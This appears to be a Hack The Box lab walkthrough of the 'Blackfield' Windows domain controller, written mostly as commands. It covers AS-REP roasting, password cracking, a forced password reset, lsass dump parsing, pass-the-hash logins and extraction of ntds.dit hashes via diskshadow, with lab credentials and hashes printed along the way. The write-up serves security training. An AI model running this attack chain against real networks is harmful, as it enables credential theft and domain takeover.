---
description: https://app.hackthebox.com/machines/255
---

# Blackfield

## Nmap

```
nmap 10.10.10.192 -p- -sS -sV         

PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-03-10 21:09:13Z)
135/tcp  open  msrpc         Microsoft Windows RPC
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
```

{% hint style="info" %}
Add "10.10.10.192 blackfield.local" to /etc/hosts.
{% endhint %}

Starting out we hit kerberos on port 88 against a large username list. Pulling the known account name of _Support@blackfield.local_.

![](<../../../.gitbook/assets/image (2045) (1) (1) (1) (1).png>)

With no further user accounts discovered we can check null credentials against SMB with `smbmap`.

```
smbmap -u null -p "" -H 10.10.10.192 -P 445 2>&1
```

![](<../../../.gitbook/assets/image (2054) (1) (1) (1) (1) (1).png>)

We have some non default shares. The `profiles$` share is of interest as we have _READ ONLY_ access to the share.

Using the smbclient command below, we can recursively download all files and folders in the share.

```
smbclient '\\10.10.10.192\profiles$' -N -c 'prompt OFF;recurse ON; mget *' 
```

![](<../../../.gitbook/assets/image (2071) (1) (1) (1) (1) (1) (1) (1) (1).png>)

None of the directories contain any files it seems. We do however, have folders named after potential users. Utilizing this information we can print the direct list to file.

```bash
find . -maxdepth 1 -type d -printf '%f\n' > users.txt
```

![](<../../../.gitbook/assets/image (2043) (1) (1) (1) (1).png>)

Against kerbrute we can check for which users exists.

```bash
python3 kerbrute.py -users '~/blackfield/users.txt' -domain 'blackfield.local' -dc-ip '10.10.10.192' -outputusers '~/known_users.txt'
```

![](<../../../.gitbook/assets/image (2051) (1) (1) (1) (1) (1).png>)

We now have a confirmed user list:

```
svc_backup
audit2020
support
```

Where the user support has "Do not require pre-authentication" enabled in Active Directory. With this, we can potentially pull the kerberos hash with Impacket's `GetNPUsers.py`.

```
python2 GetNPUsers.py blackfield.local/ -dc-ip 10.10.10.192 -request -usersfile ~/known_users.txt -format john -outputfile ~/hashes.hash
```

![](<../../../.gitbook/assets/image (2052) (1) (1) (1) (1) (1).png>)

Reading the output file we see our confirmed hash for the _support_ user.

![](<../../../.gitbook/assets/image (2057) (1) (1) (1) (1).png>)

```
$krb5asrep$support@BLACKFIELD.LOCAL:e4be5339949e37a4049a10b4a175f5e1$0a4606e9cc22be8bf26959b078d7d94703674c0df20808c3d93b2d09d0bacbaef84cc3b1fefd4384b545ce8d109b503db0e4705e4a94d0b8c681ec8a44cbdda2cadd94ea65c94f4e0ac956743ad3dbc2696cf5ad1fcb4aedc95bc8e5e7686311f7471a3455f59f422a4fa99b2850cdab872f065f680239ddc5007f2f1866d705808262203e50ccca81a32ffa1fbcdab215c29ada83678e4298a8ab92e1bf871ae507963f68453289a702bfa9df8ab2b4b73cc0cf07b95d4fb4c0f765f5b4712ce871eb9bd641e41df7efc7243b5e3cc8e92dcc2778c3b25756ebfbef86741840357839d0926f731a6d64bf335c3f675c237bc650
```

Which, can be cracked wsith `John` against the _rockyou.txt_ password list.

```
sudo john --wordlist=/usr/share/wordlists/rockyou.txt hashes.hash
```

![](<../../../.gitbook/assets/image (2058) (1) (1) (1) (1) (1) (1).png>)

Revealing the users password.

Credentials:

```
support:#00^BlackKnight
```

Checking with `crackmapexec` shows the credentials are valid.

```bash
crackmapexec smb '10.10.10.192' -u 'support' -p '#00^BlackKnight'
```

![](<../../../.gitbook/assets/image (2050) (1) (1) (1) (1) (1) (1).png>)

However, at the point we do not have code execution over SMB. We are not a member of "Remote Management Users" and RDP is not running.

What we can utilize however, is `bloodhound` to pull domain informaiton externally using Bloodhound.py.

**GitHub:** [https://github.com/fox-it/BloodHound.py](https://github.com/fox-it/BloodHound.py)

```bash
python2 bloodhound.py -u 'support' -p '#00^BlackKnight' -ns '10.10.10.192' -d 'blackfield.local' -gc 'dc01.blackfield.local'
```

![](<../../../.gitbook/assets/image (2040) (1).png>)

After uploading the results to bloodhound we then further investigate our currently owned user _support_. Looking at the node information we see we have deriative permissions on the "ForceChangePassword" attribute over the user _Audit2020_.

![](<../../../.gitbook/assets/image (2041) (1) (1).png>)

We can force a password change externally with rpcclient as shown below.

```bash
# setuserinfo2 username level password [password_expired]

rpcclient -U support //10.10.10.192 
setuserinfo2 audit2020 23 'Password123'
```

After the password change we can confirm the credentials with `crackmapexec`.

```bash
crackmapexec smb 10.10.10.192 -u 'audit2020' -p 'Password123' --shares
```

![](<../../../.gitbook/assets/image (2044) (1) (1) (1) (1) (2).png>)

From our previous findings we know that a forensic SMB share exists. The user _audit2020_ has access to the share.

```bash
smbclient -U 'audit2020' '\\10.10.10.192\forensic'  -c 'prompt OFF;recurse ON; mget *' 
```

![](<../../../.gitbook/assets/image (2048) (1) (1) (1) (1) (1) (1).png>)

Looking inside the memory\_analysis folder, the most interest standout file would be lsass.dmp. Hopefully we can pull some user hashes or password from this.

![](<../../../.gitbook/assets/image (2036) (1) (1).png>)

`lsass.dmp` is dump file format. The best dedicated tool for this is likely `pypykatz`.

**Github:** [https://github.com/skelsec/pypykatz](https://github.com/skelsec/pypykatz)

**Install**

```bash
# Clone repo
git clone https://github.com/skelsec/pypykatz.git
# Install
pip3 install pypykatz
```

The following syntax can be used to analysis the `lsass.dmp` file.

```bash
pypykatz lsa minidump '~/blackfield/memory_analysis/lsass.DMP'
```

![](<../../../.gitbook/assets/image (2039) (1) (1).png>)

As shown above we can see the NT hash for the account _svc\_backup_.

As we know from earlier enumeration, this user is a member of the "Remote Management Users" group. As such, we can use `Evil-WinRM` to login with the account hash.

```bash
evil-winrm -i '10.10.10.192' -u 'svc_backup' -H '9658d1d1dcd9250115e2205d9f48400d'
```

![](<../../../.gitbook/assets/image (2065) (1) (1) (1) (1) (1) (1) (1) (1).png>)

We know this account is already a member of the "Back Operators" group. Let's double check we have the "SeBackupPrivilege" privilege assigned to us so, we can perform privilege escalation.

![](<../../../.gitbook/assets/image (2049) (1) (1) (1) (1) (1) (1) (1) (1).png>)

This privilege grants us the ability to create backups of files on the system. Knowing this, a high value file would be the `ntds.dit` file which is a database of hashes for domain objects / users. As the ntds.dit file is in constant use we will be unable to create a backup using normal methods as the system will lock the file.

What we can do instead is create a **Distributed Shell File** (DSH). This file will contain the appropriate commands for us to run the diskshadow utility against the C: drive and ultimately, the ntds.dit file.

I have previously covered this technique before as linked below.

{% content-ref url="../../tryhackme/linux/fusion-corp.md" %}
[fusion-corp.md](../../tryhackme/linux/fusion-corp.md)
{% endcontent-ref %}

First created a file called `viper.dsh` on the attacking machine. Then insert the following contents:

```
set context persistent nowriters
add volume c: alias viper
create
expose %viper% x:
```

Once completed use the command `unix2dos` to convert the file to DOS format.

```
unix2dos viper.dsh
```

Then on the target system create a directory called 'temp' in `c:\temp.` After this upload the `viper.dsh` file.

From here run the following commands:

```
diskshadow /s viper.dsh
```

![](<../../../.gitbook/assets/image (2038) (1) (1).png>)

```
robocopy /b x:\windows\ntds . ntds.dit
```

![](<../../../.gitbook/assets/image (2069) (1) (1) (1) (1) (1) (1) (1).png>)

From here we need to extract the SYSTEM hive which will be required for extracting the hashes with Impacket later.

```
reg save hklm\system c:\Temp\system
```

From here we can use the download command to download the `ntds.dit` and `system` hive file.

```
download ntds.dit
download system
```

Now, over on the attacking system we can use Impacket's `secretsdump.py` to extract the domain account hashes.

```bash
python2 'secretsdump.py' -ntds 'ntds.dit' -system 'system' local 
```

![](<../../../.gitbook/assets/image (2060) (1) (1) (1) (1).png>)

With the administrators NTLM hash we can log into the Domain Controller with `Evil-WinRM`.

```bash
evil-winrm -i '10.10.10.192' -u 'administrator' -H '184fb5e5178480be64824d4cd53b99ee'
```

![](<../../../.gitbook/assets/image (2042) (1) (1) (1) (1) (1) (1).png>)
